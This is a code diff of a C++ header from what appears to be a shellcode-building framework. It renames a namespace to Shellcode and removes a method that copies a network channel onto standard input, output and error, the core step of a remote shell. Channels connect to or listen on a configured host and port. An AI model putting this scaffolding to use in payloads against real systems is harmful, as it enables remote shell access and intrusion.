@@ -1,10 +1,14 @@
 #ifndef CHANNEL_HELPER_H_
 #define CHANNEL_HELPER_H_
 
+#include <pico.h>
+
 /* Type traits can be included since they rely exclusively on standard headers and no external linking. */
 #include <type_traits>
 
-namespace Pico {
+namespace Shellcode {
+
+    using namespace Pico;
 
     //
     // The list of defined channel modes.
@@ -63,19 +67,6 @@ namespace Pico {
 
         template <enum Network::AddressType T>
         CONSTRUCTOR Channel(Network::Address<T> addr, uint16_t port);
-
-        METHOD void dup_to_stdio() {
-            if ( ChannelMode<M>::dupable_to_stdio )
-            {
-                BasicStream std_in = Stdio::input();
-                BasicStream std_out = Stdio::output();
-                BasicStream std_err = Stdio::error();
-
-                this->duplicate(std_in);
-                this->duplicate(std_out);
-                this->duplicate(std_err);
-            }
-        }
     };
 
     template<>
@@ -181,7 +172,7 @@ namespace Options {
 
     FUNCTION auto channel()
     {
-        using namespace Pico;
+        using namespace Shellcode;
         using SelectedChannel = Channel<CHANNEL>;
 
         switch ( CHANNEL )
@@ -195,7 +186,7 @@ namespace Options {
             case SCTP_CONNECT:
             case SCTP6_CONNECT:
             {
-                auto remote_address = Network::ip_address_from_bytes(HOST);
+                auto remote_address = Pico::Network::ip_address_from_bytes(HOST);
                 uint16_t remote_port = PORT;
 
                 return SelectedChannel(remote_address, remote_port);
@@ -206,7 +197,7 @@ namespace Options {
             case SCTP_LISTEN:
             case SCTP6_LISTEN:
             {
-                auto local_address = Network::ip_address_from_bytes(HOST);
+                auto local_address = Pico::Network::ip_address_from_bytes(HOST);
                 uint16_t local_port = PORT;
 
                 return SelectedChannel(local_address, local_port);
